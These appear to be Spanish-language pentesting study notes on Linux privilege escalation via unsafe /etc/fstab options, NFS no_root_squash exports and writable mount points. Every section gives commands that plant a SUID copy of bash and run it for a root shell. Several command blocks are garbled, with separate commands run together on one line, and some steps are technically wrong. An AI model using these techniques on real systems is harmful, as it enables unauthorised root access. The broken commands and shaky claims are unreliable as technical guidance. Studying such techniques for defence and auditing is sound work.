
## Formato de `/etc/fstab`
Es el archivo que define qué sistemas de archivos se montan automáticamente al inicio del sistema y como
- Formato típico: 
	```bash
	<dispositivo>   <punto_de_montaje>   <tipo_fs>   <opciones>   <dump>   <pass>
	# Ejemplo de montaje inseguro o peligroso: 
	/dev/sdb1   /mnt/share  ext4    user,exec,suid    0 0
```

| Punto clave                     | ¿Útil para escalar? | Cómo se explota                          |
| ------------------------------- | ------------------- | ---------------------------------------- |
| `user,exec,suid` en fstab       | ✅ Sí                | Montas disco → ejecutas payload con SUID |
| NFS con `no_root_squash`        | ✅ Sí                | Subes SUID payload desde otra máquina    |
| Punto de montaje world-writable | ✅ Sí                | Colocas archivos maliciosos ejecutables  |
## 🧩 1. `user`, `exec`, `suid` → **Montajes peligrosos como usuario**

### ¿Qué hace esto?

Cuando una entrada en `/etc/fstab` contiene `user`, significa que **un usuario sin privilegios puede montar ese sistema de archivos**.
Si además tiene:
- `exec` → permite ejecutar binarios desde ahí
- `suid` → permite que binarios con SUID funcionen
### ¿Por qué es peligroso?
Porque puedes **crear una imagen de disco propia con un binario SUID (como `bash`)**, montarla en el sistema, y conseguir **una shell como root**
### 🔥 Ejemplo práctico:
1. Crear un binario `bash` con SUID root:
	```bash
	cp /bin/bash ./bash_suid chmod +s ./bash_suid
	```
2. Crear una imagen de disco:
```bash
    dd if=/dev/zero of=disk.img bs=1M count=10 mkfs.ext4 disk.img mkdir /tmp/mnt sudo mount -o loop disk.img /tmp/mnt cp bash_suid /tmp/mnt/ sudo umount /tmp/mnt
```
3. Montarla usando una entrada en `/etc/fstab` que permite:
```bash
    /home/user/disk.img /mnt ext4 loop,user,exec,suid 0 0
```
4. Luego:
	```bash
	mount /mnt /mnt/bash_suid -p
	```

✅ Shell con privilegios elevados.

---

## 🧩 2. NFS con `no_root_squash` → **Root remoto = root local**

### ¿Qué es `no_root_squash`?

En sistemas NFS, normalmente el acceso como `root` desde un cliente remoto se convierte en `nobody` (por seguridad).  
Con `no_root_squash`, **eso se desactiva**, y si montas ese recurso como root, **eres root también en el servidor**.

### 🔥 Ejemplo de entrada en `/etc/exports` del servidor NFS:
```
/srv/share  *(rw,sync,no_root_squash)
```
### ¿Cómo se explota?

1. Desde tu máquina, montas el recurso:
	```bash
	mount -t nfs 10.0.0.5:/srv/share /mnt
	```
2. Subes un binario SUID como root:
	```bash
	cp /bin/bash /mnt/bash_root chmod +s /mnt/bash_root
	```

3. Luego en la máquina víctima (que monta ese NFS automáticamente), puedes ejecutar:
	```bash
	/srv/share/bash_root -p
	```
    

✅ Shell como root.

---

## 🧩 3. Montajes world-writable o mal protegidos

### ¿Qué significa?
Si un punto de montaje está en `/etc/fstab` y es **world-writable** o tiene permisos inseguros, **cualquier usuario puede escribir allí** y tal vez colocar payloads maliciosos.

### ¿Por qué es riesgoso?

- Un cronjob podría ejecutarse desde allí
- Un demonio (`systemd`, `rsync`, etc.) podría procesar archivos colocados por un usuario
- Pueden haber binarios o scripts llamados desde ahí con permisos root

### 🔍 ¿Cómo lo detectas?

```bash
findmnt ls -ld /mnt /media /srv
```

Busca:
- Permisos `drwxrwxrwx` o `drwxrwxr-x`
- Dueño `root`, grupo `users`, etc.
---

## 🧩 4. Archivos de montaje tipo `tmpfs`, `iso9660` o `vfat`

### ¿Por qué importa el tipo de sistema de archivos?

- Algunos sistemas de archivos como `vfat` **no soportan permisos Unix**, lo que puede llevar a que **todos los archivos sean ejecutables por todos**.
- Otros como `tmpfs` pueden permitirte montar memoria como disco y ejecutar cosas sin tocar disco real.

### 🔥 Ejemplo:

Si ves esto en `/etc/fstab`:

```bash
tmpfs /mnt/tmpfs tmpfs rw,user,exec 0 0
```

Puedes hacer:

```bash
mount /mnt/tmpfs cp /bin/bash /mnt/tmpfs/bash chmod +s /mnt/tmpfs/bash /mnt/tmpfs/bash -p
```

✅ Shell root si el binario se ejecuta desde un proceso con privilegios.